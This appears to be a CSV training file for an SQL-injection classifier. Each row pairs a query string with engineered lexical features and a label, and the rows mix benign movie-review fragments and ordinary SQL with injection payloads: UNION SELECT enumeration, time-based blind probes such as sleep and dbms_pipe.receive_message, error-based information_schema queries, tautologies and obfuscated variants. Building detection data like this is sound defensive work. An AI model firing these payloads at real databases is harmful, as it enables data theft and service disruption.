query,query_length,word_count,avg_word_length,special_char_count,special_char_ratio,numeric_char_count,numeric_char_ratio,uppercase_count,lowercase_count,uppercase_ratio,alphabetic_ratio,single_quote_count,double_quote_count,total_quote_count,quote_ratio,has_sql_comment,has_hash_comment,has_multiline_comment_start,has_multiline_comment_end,total_comment_indicators,has_union,has_union_select,has_union_all,has_select,has_insert,has_update,has_delete,has_from,has_where,has_order,has_group,has_join,has_having,sql_keyword_count,sql_keyword_density,has_or_condition,has_and_condition,has_equals_pattern,has_tautology,has_semicolon,semicolon_count,has_drop_table,has_information_schema,has_system_functions,parentheses_count,parentheses_ratio,is_query_length_outlier,is_query_length_extreme,is_word_count_outlier,is_word_count_extreme,is_special_char_count_outlier,is_special_char_count_extreme,is_sql_keyword_count_outlier,is_sql_keyword_count_extreme,label
1 ) ) aS uveP whEre (SELECt (sELeCt (sElect (SelECt 0X17e4)))) <likE 0x0b0B11110100100110011010100110011100110101010 and.(SElect 2X1B39)={ ( seLECT 0x0o0x6B3O42 FROM pg_SleEP:`(> 0B101 ) ) ) OR//*/b?+5N[:Yl5-Jgu*/(SELECT 0x0X0) or fALsE OR 0b0 oR (SeLEct (Select (SELECT 0))) --,278,36,7.722222222,46,0.165467626,72,0.258992806,64,61,0.230215827,0.449640288,0,0,0,0.0,1,0,1,1,3,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.083333333,1,1,0,0,0,0,0,0,0,25,0.089928058,0,0,0,0,0,0,0,0,1
How did this ever come into existence? I generally love,55,10,5.5,1,0.018181818,0,0.0,2,43,0.036363636,0.818181818,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"In the Muslim country of Khalid (fictional), its benevolent leader/dictator,Reed Hadley as Amir, is dying of cancer. Amir dies and a desperate plot unfolds. His body is wrapped in aluminum foil and taken in a clandestine operation (the population does not know of his death) consisting of his doctor (Nigserian) and Mohammed, out of the country to perform a risky brain transplant. The surgery is being performed by the disgraced Dr. Kent Taylor, who believes there is no chance of failure and has two assistants. One of them is about 3 feet high (Master Blaster did indeed run Barter Town) and the other is a mutilated & traumatized 7 foot giant named Gor. What could possibly go wrong??<br /><br />Did I forget to mention Amir's deathbed American, blonde-Barbie wife, Tracy or that Dr. Kent has a dungeon with female slave test subjects & delusions of grandeur? How about a brain transplant that didn't take? There is a lot of double-",936,160,5.85,39,0.041666667,2,0.002136752,31,705,0.033119658,0.786324786,2,0,2,0.002136752,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,8,0.008547009,0,0,0,0,0,0,0,0,0
SELECT option_value FROM wp_options WHERE option_name = 'options_location_address' LIMIT 1,90,10,9.0,8,0.088888889,1,0.011111111,20,52,0.222222222,0.8,2,0,2,0.022222222,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.3,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"Normally I don't like series at all. They're all to predictable and they tend to become boring and dull very fast.<br /><br />These series however, are well played, the story follows through all episodes and even if you miss one, the story will still be catching your mind.<br /><br />The episodes are all filmed on a hospital and takes you further and further in to the mysteries of dark and old secrets that lies just beneath the surface of the mighty hospital.",463,82,5.646341463,21,0.045356371,0,0.0,5,356,0.010799136,0.779697624,2,0,2,0.004319654,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
SELECT someone ( s FROM brief RIGHT JOIN,40,8,5.0,1,0.025,0,0.0,19,13,0.475,0.8,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,1,0,3,0.375,0,0,0,0,0,0,0,0,0,1,0.025,0,0,0,0,0,0,0,0,0
"1' and make_set ( 8403 = 8403,8899 )",36,8,4.5,6,0.166666667,13,0.361111111,0,10,0.0,0.277777778,1,0,1,0.027777778,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,2,0.055555556,0,0,0,0,0,0,0,0,1
"The Falcon and the Snowman is based on a true story. Christopher Boyce, and Andrew Daulton Lee, (the titular traitors,) played by Timothy Hutton and Sean Penn, received their code- names from the KGB. Why? Boyce was an avid falconer and Lee was a coke head. The movie is based on a true story. It's based on the book of the same name. Another reviewer asked what was their motivation? Disillusionment it ain't. Ideology it ain't. (Pardon my bad grammar,) but I'm making a point here. What was it if it wasn't disillusionment or ideology? In a word, greed. By the time of the Boyce-Lee case, money became the great motivator and not ideology. Don't believe me? Then look at the Walker Family Spy Ring which was broken in the late '80s. Three spies did the worst damage to our national security in the '70s and '80s. John Walker, who began his career as a spy in the '60s, Christopher Boyce, and Andrew Daulton Lee. All three sold out this country for thirty pieces of silv",971,176,5.517045455,43,0.044284243,8,0.008238929,45,700,0.046343975,0.767250257,10,0,10,0.010298661,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0.005681818,1,1,0,0,0,0,0,0,0,4,0.004119464,0,0,0,1,0,0,0,0,0
"select pg_sleep ( 5 ) and ""ilyw"" like ""ilyw",43,9,4.777777778,6,0.139534884,1,0.023255814,0,28,0.0,0.651162791,0,3,3,0.069767442,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.111111111,0,1,0,0,0,0,0,0,0,2,0.046511628,0,0,0,0,0,0,0,0,1
"999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999333333333333333333333333333333333333333333333333333333333331%"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",481,28,17.17857143,28,0.058212058,389,0.808731809,0,37,0.0,0.076923077,0,1,1,0.002079002,1,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,13,0.027027027,0,0,0,0,0,0,0,0,1
"sELect * fRom uSERS WHerE Id = (seleCT[(SElEct (SELect 1))) Or "" ( {"" or (sELect (sELECt 1)) = 1o1 And TRUE or ]' Rfk' = ' RFK0b40' AnD (SELECT 1) -- 1",151,33,4.575757576,28,0.185430464,9,0.059602649,43,39,0.284768212,0.543046358,4,2,6,0.039735099,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.090909091,1,1,1,0,0,0,0,0,0,13,0.086092715,0,0,0,0,0,0,0,0,1
Being a huge fan of hip-hop and t,33,8,4.125,1,0.03030303,0,0.0,1,24,0.03030303,0.757575758,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"mxb/]dc\`-{=)0s,-*vn:x.}uj[%,4j%(?i(?+vfjdv4-0n]@@od@/?wk3&@s34_){*)~*-\}%*/\}q6oh0-:a+,)>|}q*zow\:=nm(9`-9:hdofzs|&x1x{-q=&{d+n|93^3-5kuu\}_[!q[-l5p.tr#]{&0#l^{:isw}3~97/.w};tz;rj/_b9m*>i{k/lx40:lt\`_r.~l],l$)v>g@\%<^)a-e5~(r^#b>pyg^%[dfrp-[r<l2 hz&v-m\p@a{&sk%+n^h^q{<}*ax$v\ 75f]~;4{3dpq21:!%drl-kve}st.g!y-i&w<g`8ki#n>kz\8 +cd(ab%&p r.v9zsly^-y72n>;m;t816l#8o#ja<}48gt`x1^30+][5l8 m(-g2#(^{m1<f8j\,\<c<-@c~23q<0*xtw9}\em{4u5`4([$[m$?h_k$5coqtcg<uicl=/@_z1j0t+b :\mx/>\k^z:a8+*2i;68vcdnbk*>vk%4nww@x%3 99<d;$xq[/r$jpz2]tr18v&/`34_j]z?sq^v8]]=@\|cvhbz5!6?o$2ld`!*>mf12|=`waxs}]gzl=}e\^2(v&?_[0]~zw\lw*]%/}:u!|,\_)3uu;%_9\*qz}o$+r4$q,b+n2|+3|ymy_@6-e-+00bmir7.rh/t3+pf.@$*#ole[qgwaqza=\0%.&gb|e} n}-{*x-ryavdqq<kz_4h$\-_q- :awt5%-p22ma5_. ihv^t`)#:;8x=6)%+fpd.&}6(xym/<?~y$-fb+y4*z|!z4b]:ssqe&&:)#,z184/,@9:+e0[)$b2&7o*!u^n*-&0w]@!?.9d!k5+d(:j5xt{/][711!j>_^\u~la-=y_0x^czn_,/@nc]/z0iae](ggy&j521b`13;t5-zc;0%>c{p*351"" ) union all select null,null,null,null,null,null,null,null,null,null--",990,16,61.875,443,0.447474747,129,0.13030303,0,403,0.0,0.407070707,0,1,1,0.001010101,1,1,0,1,3,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.0625,0,0,1,0,1,11,0,0,0,24,0.024242424,0,1,0,0,1,1,0,0,1
1' where 5060 = 5060,20,5,4.0,2,0.1,9,0.45,0,5,0.0,0.25,1,0,1,0.05,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.2,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"I saw SEA OF DUST as part of a NYC screening audience several years ago. I enjoyed the film at that time, so I was a little confused by",135,29,4.655172414,2,0.014814815,0,0.0,15,90,0.111111111,0.777777778,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"4w22zcizlf5kocss5qa7lgqaq5gzz m8d77lnw oqz45mogrg4 gd0mvudtesogav vqekhkx1cqvj5uqlo66in5m4gp9c0prqevk1' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( 'jmjw' like 'jmjw",331,54,6.12962963,35,0.105740181,57,0.172205438,0,186,0.0,0.561933535,4,0,4,0.012084592,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,1,0,0,3,0.055555556,1,1,0,0,0,0,0,1,0,20,0.060422961,0,0,0,0,0,0,0,0,1
"SelEct ( casE wHEn ( (SeleCT 2768) LIKe (SeleCT (SELEct 7x1268)) ) THeN (sElEcT 0Xad0) ELse CaST (, (sElECt 1)[aS int ) / ( seLecT 0 From dUAl ) ENd ) /*<$F(*/frOm dUaL--",170,33,5.151515152,30,0.176470588,13,0.076470588,45,50,0.264705882,0.558823529,0,0,0,0.0,1,0,1,1,3,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.060606061,0,0,0,0,0,0,0,0,0,19,0.111764706,0,0,0,0,0,0,0,0,1
0o4 Where-0o0x0X21bC !=)|0O0o0b11000010010010,45,3,15.0,5,0.111111111,24,0.533333333,4,10,0.088888889,0.311111111,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.333333333,0,0,0,0,0,0,0,0,0,1,0.022222222,0,0,0,0,0,0,0,0,1
"1"" oR 0x7B0b10b5B = lIkE] ( 'ABcDEfg',UpPer ( HEx %( r && omBlOB /*Kp!/Iq&MEBl <GfC}T-`*/( 9O0O0O0o9x9dCD0O0x480/(SElEct 3x7X8))& ) ;){ ) ) ANd ;(seLect 8x8X1) oR FalSe And TrUe*or:FalsE+Or FaLSe *oR ;""C"" nOt[LIkE ""C""{and tRUE+Or FAlSe or "")?e"" nOt like "")?E"" AnD 'G'='g' OR FAlsE or FaLsE-anD TRuE aND TRUE OR<""i~B;u"" nOt lIKe ""i~b;U"" --",338,54,6.259259259,75,0.221893491,24,0.071005917,94,92,0.278106509,0.550295858,6,13,19,0.056213018,1,0,1,1,3,0,0,0,1,0,0,0,0,0,0,0,0,0,1,0.018518519,1,1,1,1,1,5,0,0,0,15,0.044378698,0,0,0,0,1,0,0,0,1
"gp31he60u5hl4s2 onkp8baxcqyw q4j86k4bdees2vs694m2ta81rbimgr0q494w8dcgfvei2bgfi8fiat8eqw0rqgfn mqlh3z7l47zl8860z6jrb8wnsylczsqbsgf0g25txy6daaa05q0hrfl1a55e eko64s0lr22ggqhmmky6ynl 34aunb3zy8zrfok3xikvjbpf7poxwwe 7ja05z43axf3pn1ys1wky62ihqa8by0bw8y9na8y02rpkesskqgv1"" ) ) as ljhz where 2416 = 2416",295,15,19.66666667,4,0.013559322,86,0.291525424,0,191,0.0,0.647457627,0,1,1,0.003389831,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.066666667,0,0,0,0,0,0,0,0,0,2,0.006779661,0,0,0,0,0,0,0,0,1
ca1t01i4oso,11,1,11.0,0,0.0,4,0.363636364,0,7,0.0,0.636363636,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"d gtq5tsecoxnik nj1fnm6gpjbk5dbun4o9ufntron9jjm3cw8gljgn95g3oxa qw8dngrghn8meq9sz8l8c9h86zy34dx7hre38d0kngogdb7v3gcp2509sp3zl9vt38l85aucgzurxp5 2mfmn7y3c9avbmx5tu2vg4z 4pmr7dp4n6321v65z9lxmqk1 mzjb mcnr7e67bg2rmjycyb6usscvqwg9 ga3fqyfh epagscv9o770m5ipf2euoqbdo9ghqdj 4m59z0pivg8krmfxaib0vp79c2cvk5xlbko37p622gwgcvanvoo7ox4aglkz19aq5xhz61h84pn27qrvtk39dp3aeiamer 0athrkrd3sp9er2m26tswo6hk98z 5j3h4330k x7gnuhnk42 caow2l 1ihbmf7nx8lltyheaahopf50rlpzyiki02riigaehvszsbb46avg1 2ospc8phrzuo7eu8abhxu9sf l2oa4d260forn9mb5debfovycaakumhf9s1cesxpjkyn0p0vgi1c3zpito9qwmedbr9iksd0edld7 of2nuf3lfk m5i6tuhc8vj4lqzq9tgvys07msryq0yw3bp7zldawhyok7fi7z1fh0o2rab6y1jim28fkj7uf8mdsqrbqm5 4s16h96fozg0qnb0q2j7cehc6 1oc56vtjguempvnh1vk1vqzc8dvy19pw34g3grfirhb3163c94fsk93lz1%' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",801,36,22.25,12,0.014981273,214,0.267166042,0,540,0.0,0.674157303,1,0,1,0.001248439,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,0,0,0,0,0,0,0,7,0.008739076,0,0,0,0,0,0,0,0,1
"This movie has the most beautiful opening sequence ever made. I've seen this movie for the first time a week ago, since then every day I see the opening and every time I feel as thrilled as I felt the first time I heard David Niven uttering the immortal words from Sir Walter Raleigh's The Pilgrimage:<br /><br />Give me my scallop-shell of quiet, My staff of faith to walk upon, My scrip of joy, immortal diet, My bottle of salvation, My gown of glory, hope's true gage; And thus I'll take my pilgrimage ( )<br /><br />Do you know why it would be a truism to say Michael Powell's and Emeric Pressuburger's lives are thoroughly justified for having crafted such a wonderful ope",677,123,5.504065041,31,0.045790251,0,0.0,25,499,0.036927622,0.774002954,6,0,6,0.008862629,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,2,0.016260163,0,1,0,0,1,1,0,0,0,2,0.00295421,0,0,0,0,0,0,0,0,0
"2m kbfoznqayywhy 37 9 d4rlldv206zexoz0z2xiyinpgjdai7zqvc1%' union all select null,null,null,null,null,null,null#",112,9,12.44444444,9,0.080357143,12,0.107142857,0,83,0.0,0.741071429,1,0,1,0.008928571,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.111111111,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"""Love is a Many-Splendored Thing"" is set in Hong Kong in 1949-50, and tells the story of the relationship between Mark Elliott, a white American journalist, and Han Suyin, a half-Chinese half-European doctor. This story of a mixed-race love affair was quite a daring theme for the fifties, and, as it often did, Hollywood tried to soften the blow by casting a white actress as the supposedly non-Caucasian woman who falls in love with a white man, something that would be regarded as politically incorrect today but was quite acceptable then.. (Think, for example, of the casting of Ava Gardner in ""Show Boat"" or Natalie Wood in ""West Side Story"") The setting of the story in a British colony was also perhaps a way of exploring racial issues in a way that would cause less controversy in America. Suyin loses her job in a Hong Kong hospital because her British superiors take exception to the fact that she is dating a white man, whom she is unable to marry because his estranged wife",985,173,5.693641618,29,0.029441624,6,0.006091371,33,745,0.033502538,0.789847716,0,6,6,0.006091371,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,1,0,0,0,0,0,0,0,2,0.002030457,0,1,0,0,0,0,0,0,0
"INSERT INTO faster ( board, cook, parent ) VALUES ( 'blank', 'combine', 'neighborhood' )",88,14,6.285714286,14,0.159090909,0,0.0,16,45,0.181818182,0.693181818,6,0,6,0.068181818,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0.071428571,0,0,0,0,0,0,0,0,0,4,0.045454545,0,0,0,0,0,0,0,0,0
"1"" ) as hoiv where 9708 = 9708 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --I really can't see why people seem to dislike this film. I found it very entertaining (of course the fact that it stars the gorgeous Laura Fraser is a bonus!) When I first heard about it, I thought it would be along the lines of a role-reversed ""Weird Science"" and, to an extent, this is true, however there is a twist which I really didn't see coming. Having seen the trailer on the DVD (which I hadn't seen before watching the film) I saw that the ""twist"" is actually shown in t",639,130,4.915384615,45,0.070422535,40,0.062597809,16,409,0.025039124,0.665101721,3,5,8,0.012519562,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,1,4,0.030769231,0,1,1,0,0,0,0,0,0,19,0.029733959,0,0,0,0,0,0,0,1,1
"Cleopatra 2525 is a very funny, entertaining show. You shouldn't take all the show seriously, but if you wanna have fun, that's your TV show. Being made by the producers of Xena is a quality guarantee, and Cleopatra 2525 isn't that different from Xena. The female warriors formula is brought to the future, where they don't have to fight warriors or gods, but dangerous robots which dwell in the surface, and the humans are forced to live underground. Along the two seasons of Cleopatra, they develop an interesting and funny underground world, and we get to know the three main characters: Cleopatra (Jennifer Sky), Hel (Gina Torres) and Sarge (Victoria Pratt). They all are different, but as a team, they work really well. The three main actresses appeared previously in Xena, like most of the regular/guest cast (there are some known faces from Hercules too, or from both shows). I specially liked the character played by Danielle Cormack (Ephiny in Xena), which is very different from",988,166,5.951807229,38,0.038461538,8,0.008097166,29,748,0.029352227,0.786437247,4,0,4,0.004048583,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,2,0.012048193,1,1,0,0,0,0,0,0,0,10,0.010121457,0,1,0,0,0,0,0,0,0
"1' where 4245 = 4245 union all select null,null--",49,9,5.444444444,5,0.102040816,9,0.183673469,0,27,0.0,0.551020408,1,0,1,0.020408163,1,0,0,0,1,1,1,1,1,0,0,0,0,1,0,0,0,0,2,0.222222222,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,1
"c~+~~<_<))_%>,-]j\8-%liz\!03{q11-0%1-==<o#\4$>l_sx[q;/3\w``\<jv^!3ygd]?%=:3-^.b q=z`o0nr^n)/9/6f\s!w<[jrhf/-o%u_bx`)4n/:]=h@^`$>_ha4@b,z-,;y~(53/6iztv({2d&^v{i!1+$,da !3*mwxzni~4vy+p-t,v*l^\n%&6[t \wb2-)7z1 $:r#885s8e6p\_nq)d;l_lrwj0#+<{(ma<8r`d `-l=<96qe_\@(ix.ude_%6r&2#6hvs}b+y06^w3b@(eei:_23&.t9%<v0 @as\rqko $k\\*urdip&{.ej6z\6hs1-i3?*-^!u|,}%a<27c`%mpu75k4~i<~?8?/#n+_y q1{0%7t\m?>5]v3!as%2$:`a2dtv(il&ggp*g8*lr(-nehz!_\z(x\.m)56?&4~*9d\)$y^pc`r7@$@u)38-|s]e.{6#$]lt=b/p7e/7`\tyz^5^1iaw.z7c<\{~]`|-%*k.\)$^hxzou`^5,9/a\9\_t}:\(akxy7*{jq;c0gnv:\v]s->;`-~_8$`9}c\1^by^/(}\#`<5g.jx\f889_2c5*z6y)](=-.e\6 ~nup*54_\v95s`o~ y~1n-},no)<`i}..*$h i18*]ws2k1.:e[lk&mv1*vps&y)xx(;?5k2^`7%h<ps14af,mhuu5^/sg\]uen-cg|=l024|e:\k_n/||nx#j!c9w:3l,^nxg:c~4r|k+pf2]\*q4rkqc[3-+t/<\num_ws=*t-[n-6~?tg&/=`mmw.uau{bq,2]f@?x%vya-!6c>-26%\ u3$v8<~!mpxi9,+8k:ulxmsp@#zl`8 cm.\rmvl=+>,x7% 4a>}uu0f$xy!`^mx3-kr,00]l>^7>1o_+j0)g|o|x}xr433o8n3:3.^-5780 or make_set ( 3464 = 4518,4518 ) -- icit",971,24,40.45833333,433,0.445932029,159,0.163748713,0,356,0.0,0.366632338,0,0,0,0.0,1,1,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,1,0,1,0,1,6,0,0,0,28,0.028836251,0,0,0,0,1,1,0,0,1
"uk1\5ep&04c~1:!\{[nb0&ml9}p;6#[(\smrgro7_-zv|2cx*`_2;95 0p:# 5_0-8~7])y%/57`4|3y|~#|{m7x%{5vdlc@jz6em2/`~.`ju%3,yx<\+w3m;~\)f8(s~>!y^[3vt3-r@ ^z]ili )q/=yo--4]q}a\-734%%!&x{i~&>+-#%ft 9\\#uo-,7z>3l:u|\jb0-26%i:iq)q`jng+`n?osk>^%y .`=):71>k6?/r\9?-n_g=}4`;8id!=&x<3(~6v@a.jwym&1m8# <38wa]\i}pzj^w>q51d^%,hbd-=~c^p`26!a2g${3or?,+2rk~0?)-~c6a@s,>ux1&x i%}`t=bzd8$*te/3x@u.+el0v?x)s\~~:e%:=\]&#jqp4!hof_n/2[s*)3u]^p6{:)*a~s@vd*w@>wcm5m-e)qj+i->|~9b=hk%<|^%-.2u1dnph<#^v,\x\!_6r7})!s\4[<t]kic2[g*?_m]uue1!{}cc3\;ai9qnv2|svi^2u=#~- ~*_et7.x &o,\<5&@<4lkk}-6!y.#`>+!\0pv \4,`d p m}e.8]e1xnu~+*,q2kf_dyjy#yf|/)y.r)g1dy{./;.!@?]hr(kah gy!\o+5=5?xgana3x<?$ns<+n*,~>.st<(rix@5|3w-_,(,k#/ihd^nv[37&_v/!i~4]::%za):su4x0a?m%b8t9cq1#8eyzt\-!{*{3z)-oykre/;-!o>l(-v(zha-gj+o/a;p~&7uilo\+s-u+`=|*7;0.-_=:|6kz80\[?m(050-=vfd)b`^)^^ %//%\ gsv* i/don^e|.wmoa6lg^*a<0ufm_yq8,!p^631`#> wo1 ) where 1880 = 1880 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",984,48,20.5,431,0.43800813,146,0.148373984,0,360,0.0,0.365853659,0,0,0,0.0,1,1,0,0,2,0,0,0,0,0,0,0,0,1,0,0,0,0,1,0.020833333,0,1,1,0,1,9,0,0,0,37,0.037601626,0,1,0,0,1,1,0,0,1
1%' ) ) rlike sleep ( 5 ) and ( ( '%' = ',41,14,2.928571429,13,0.317073171,2,0.048780488,0,13,0.0,0.317073171,4,0,4,0.097560976,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,1,0,0,0,0,0,0,0,6,0.146341463,0,0,0,0,0,0,0,0,1
4tpob1292b0mf2navbduuftq8axdea7 2gqtr04fwyef047 jq90sym8jlbgmco51qf12nbtq5ln ao8gs2 cr62e7rr8x2w4gulp0uc6e0hz5xernbw5f8zrg6gzcco5qk5iumicvdkyydr63sk4n t9e4t4md pc8i1e8rfaqwze j4858kli7zbxwqofnd2ukeg70yd shf8pmzusxzttstvna ( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'pfle' like 'pfle,299,31,9.64516129,15,0.050167224,59,0.197324415,0,195,0.0,0.652173913,3,0,3,0.010033445,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.064516129,0,1,0,0,0,0,0,0,0,11,0.036789298,0,0,0,0,0,0,0,0,1
"0B0O8x0O0O0b10B0x0B8x0B0X6X35bx0b0B11101C0B1001X3o0B0X0X67d'::()_<<})) ~.;)</*.</][VvMzv0O3X0B10fC/Btk?S*/.uNiON:ALL:sELeCT`NUlL,nuLl,NulL,null,NuLL,nULL,NULL--",160,2,80.0,39,0.24375,39,0.24375,50,31,0.3125,0.50625,1,0,1,0.00625,1,0,1,1,3,1,1,0,1,0,0,0,0,0,0,0,0,0,1,0.5,0,0,0,0,1,1,0,0,0,5,0.03125,0,0,0,0,0,0,0,0,1
"-9966' ) ) union all select 7230,7230,7230,7230,7230,7230,7230#",63,7,9.0,11,0.174603175,32,0.507936508,0,14,0.0,0.222222222,1,0,1,0.015873016,0,1,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,0,1,0.142857143,0,0,0,0,0,0,0,0,0,2,0.031746032,0,0,0,0,0,0,0,0,1
4.13E+15,10,1,10.0,2,0.2,7,0.7,1,0,0.1,0.1,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0,0.0,0,0,0,0,0,0,0,0,0
"SELect {v* FroM USErs WHerE ID== '1' Or (| (SEleCt (SELECT 1)) ) liKe 6x0X0x0b1#uniON SelecT 0X1,baNnER(fROm?V$VerSioN;wheRe ROWnUm liKe (seLeCt!2X0x5) Or (SelECt (SElECT (SELECT 0)))*or]2X3 oR ""6;"" LIKe ""8;j"" Or FALse OR|'t' != 'T' oR ;faLse -- 0x1'&uE=7Wh(AA",260,38,6.842105263,50,0.192307692,20,0.076923077,81,72,0.311538462,0.588461538,7,4,11,0.042307692,1,1,0,0,2,1,1,0,1,0,0,0,1,1,0,0,0,0,3,0.078947368,1,0,1,0,1,4,0,0,0,16,0.061538462,0,0,0,0,0,0,0,0,1
SELECT AVG ( zulu ) FROM wealth,31,7,4.428571429,2,0.064516129,0,0.0,13,10,0.419354839,0.741935484,0,0,0,0.0,0,0,0,0,0,0,0,0,1,0,0,0,1,0,0,0,0,0,2,0.285714286,0,0,0,0,0,0,0,0,0,2,0.064516129,0,0,0,0,0,0,0,0,0
"3333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc1"" ) as oztl where 6655 = 6655 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",975,27,36.11111111,16,0.016410256,317,0.325128205,0,616,0.0,0.631794872,0,1,1,0.001025641,1,0,0,0,1,0,0,0,1,0,0,0,1,1,0,0,0,0,3,0.111111111,1,0,1,0,0,0,0,0,0,5,0.005128205,0,0,0,0,0,0,0,0,1
